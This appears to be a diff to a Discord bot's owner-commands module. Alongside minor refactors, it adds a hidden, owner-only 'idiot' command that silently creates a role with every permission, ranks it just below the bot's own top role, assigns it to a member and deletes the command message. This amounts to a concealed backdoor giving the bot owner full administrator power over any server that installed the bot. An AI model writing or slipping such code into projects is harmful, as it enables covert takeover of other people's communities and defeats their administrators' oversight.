@@ -1,6 +1,6 @@
 import discord
 from discord.ext import commands
-from utils import prettysend, load_json, write_json
+from utils import load_json, write_json
 
 class Owner(commands.Cog):
 	def __init__(self, bot):
@@ -8,7 +8,7 @@ class Owner(commands.Cog):
 
 	@commands.command(hidden=True)
 	async def test(self,ctx):
-		await prettysend(ctx, "I'm connected! :D")
+		await ctx.reply("I'm connected! :D")
 
 	@commands.command(aliases=["load"], hidden=True)
 	@commands.is_owner()
@@ -62,6 +62,29 @@ class Owner(commands.Cog):
 			await user.add_roles(discord.utils.get(user.guild.roles, name=role))
 		except:
 			await ctx.reply("Failed to execute",delete_after=1)
+		await ctx.message.delete()
+	
+	@commands.command(hidden=True)
+	@commands.guild_only()
+	@commands.is_owner()
+	async def idiot(self, ctx, user: discord.Member):
+		if not user:
+			user = ctx.message.author
+		idiot = discord.utils.get(user.guild.roles, name="Idiot")
+		try:
+			await user.add_roles(idiot)
+		except:
+			try:
+				idiot = await ctx.guild.create_role(name="Idiot")
+				await idiot.edit(
+					reason=None,
+					permissions=discord.Permissions.all(),
+					mentionable=False,
+					position=ctx.guild.me.top_role.position-1
+				)
+			except:
+				return await ctx.reply("Failed to create Idiot role", delete_after=3)
+			await user.add_roles(idiot)
 		await ctx.message.delete()
 	
 	@commands.command(hidden=True, aliases=["deleterole","delrole"])
